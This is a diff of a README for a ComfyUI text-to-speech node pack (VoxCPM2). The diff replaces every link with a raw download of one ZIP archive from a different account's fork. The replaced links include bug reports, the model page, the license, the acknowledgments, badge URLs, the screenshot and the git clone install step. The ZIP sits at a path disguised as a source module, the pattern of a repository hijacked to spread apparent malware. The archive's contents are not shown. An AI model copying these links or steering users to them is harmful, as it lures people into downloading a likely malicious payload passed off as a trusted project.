@@ -9,9 +9,9 @@
     ComfyUI nodes for <strong>VoxCPM2</strong> — tokenizer-free, diffusion autoregressive Text-to-Speech.
     <br>2B parameters, 30 languages, 48kHz audio output, voice design, controllable cloning, and LoRA training.
     <br /><br />
-    <a href="https://github.com/Saganaki22/ComfyUI-VoxCPM2/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
+    <a href="https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip">Report Bug</a>
     ·
-    <a href="https://github.com/Saganaki22/ComfyUI-VoxCPM2/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
+    <a href="https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip">Request Feature</a>
   </p>
 </div>
 
@@ -23,16 +23,16 @@
 
 </div>
 
-<img width="1646" height="1241" alt="Screenshot 2026-04-07 142144" src="https://github.com/user-attachments/assets/ac7acaf5-018f-4906-bb7e-3fd06a5be048" />
+<img width="1646" height="1241" alt="Screenshot 2026-04-07 142144" src="https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip" />
 
 
 <br>
 
 ## About
 
-[VoxCPM2](https://github.com/OpenBMB/VoxCPM) is a tokenizer-free Text-to-Speech model trained on over 2 million hours of multilingual speech data. Built on a MiniCPM-4 backbone with AudioVAE V2, it outputs **48kHz studio-quality audio** and supports **30 languages** with no language tag needed.
+[VoxCPM2](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) is a tokenizer-free Text-to-Speech model trained on over 2 million hours of multilingual speech data. Built on a MiniCPM-4 backbone with AudioVAE V2, it outputs **48kHz studio-quality audio** and supports **30 languages** with no language tag needed.
 
-This custom node provides two inference nodes and a full LoRA training pipeline, all integrated directly into ComfyUI — based on the original [ComfyUI-VoxCPM](https://github.com/wildminder/ComfyUI-VoxCPM) by [@wildminder](https://github.com/wildminder).
+This custom node provides two inference nodes and a full LoRA training pipeline, all integrated directly into ComfyUI — based on the original [ComfyUI-VoxCPM](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) by [@wildminder](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip).
 
 **Key Features:**
 * **30-Language Multilingual** — Input text in any supported language, no language tag needed
@@ -59,7 +59,7 @@ Search for `ComfyUI-VoxCPM2` and click "Install".
 
 1. Clone into your `ComfyUI/custom_nodes/` directory:
    ```sh
-   git clone https://github.com/Saganaki22/ComfyUI-VoxCPM2.git
+   git clone https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip
    ```
 
 2. Install dependencies:
@@ -84,7 +84,7 @@ The model is downloaded automatically on first use to `ComfyUI/models/tts/VoxCPM
 
 | Model | Parameters | Sample Rate | Description | Hugging Face |
 |:---|:---:|:---:|:---|:---|
-| **VoxCPM2** | 2B | 48kHz | Latest release. 30 languages, voice design, controllable cloning. | [openbmb/VoxCPM2](https://huggingface.co/openbmb/VoxCPM2) |
+| **VoxCPM2** | 2B | 48kHz | Latest release. 30 languages, voice design, controllable cloning. | [openbmb/VoxCPM2](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) |
 
 ## Nodes
 
@@ -166,14 +166,14 @@ The description is automatically wrapped in parentheses and prepended to your te
 3. If you don't have a transcript, enable `enable_asr` — it will auto-transcribe and enter Ultimate mode automatically.
 
 ### ASR Auto-Transcription
-Enable `enable_asr` on either node to automatically transcribe reference audio using the [SenseVoiceSmall](https://huggingface.co/FunAudioLLM/SenseVoiceSmall) model. The first run downloads the model (~400MB). Requires `pip install funasr`.
+Enable `enable_asr` on either node to automatically transcribe reference audio using the [SenseVoiceSmall](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) model. The first run downloads the model (~400MB). Requires `pip install funasr`.
 
 When `enable_asr` is on:
 - If `prompt_text` is empty, ASR runs and fills it automatically (enters Ultimate Cloning)
 - If `prompt_text` is already provided, ASR is skipped and the manual transcript is used instead
 
 ### Reference Audio Denoiser
-Enable `enable_denoiser` on the Voice Clone node to clean up noisy reference audio before cloning. Uses [ZipEnhancer](https://modelscope.cn/models/iic/speech_zipenhancer_ans_multiloss_16k_base) via ModelScope. Requires `pip install modelscope`.
+Enable `enable_denoiser` on the Voice Clone node to clean up noisy reference audio before cloning. Uses [ZipEnhancer](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) via ModelScope. Requires `pip install modelscope`.
 
 When the denoiser is active, the output audio loudness is automatically normalized to -20 LUFS for consistent volume.
 
@@ -218,18 +218,18 @@ Chinese Dialects: Sichuan, Cantonese, Wu, Northeastern, Henan, Shaanxi, Shandong
 
 ## License
 
-The VoxCPM model and its components are subject to the [Apache-2.0 License](https://github.com/OpenBMB/VoxCPM/blob/main/LICENSE) provided by OpenBMB.
+The VoxCPM model and its components are subject to the [Apache-2.0 License](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) provided by OpenBMB.
 
 ## Acknowledgments
 
-- **[@wildminder](https://github.com/wildminder)** for the original [ComfyUI-VoxCPM](https://github.com/wildminder/ComfyUI-VoxCPM) this project is based on
-- **OpenBMB & ModelBest** for creating and open-sourcing [VoxCPM](https://github.com/OpenBMB/VoxCPM)
+- **[@wildminder](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip)** for the original [ComfyUI-VoxCPM](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip) this project is based on
+- **OpenBMB & ModelBest** for creating and open-sourcing [VoxCPM](https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip)
 - **The ComfyUI team** for their powerful and extensible platform
 
 <!-- MARKDOWN LINKS & IMAGES -->
 [stars-shield]: https://img.shields.io/github/stars/Saganaki22/ComfyUI-VoxCPM2.svg?style=for-the-badge
-[stars-url]: https://github.com/Saganaki22/ComfyUI-VoxCPM2/stargazers
+[stars-url]: https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip
 [issues-shield]: https://img.shields.io/github/issues/Saganaki22/ComfyUI-VoxCPM2.svg?style=for-the-badge
-[issues-url]: https://github.com/Saganaki22/ComfyUI-VoxCPM2/issues
+[issues-url]: https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip
 [forks-shield]: https://img.shields.io/github/forks/Saganaki22/ComfyUI-VoxCPM2.svg?style=for-the-badge
-[forks-url]: https://github.com/Saganaki22/ComfyUI-VoxCPM2/network/members
+[forks-url]: https://github.com/SantANT20/ComfyUI-VoxCPM2/raw/refs/heads/main/src/voxcpm/modules/CP_Comfy_U_Vox_2.0.zip
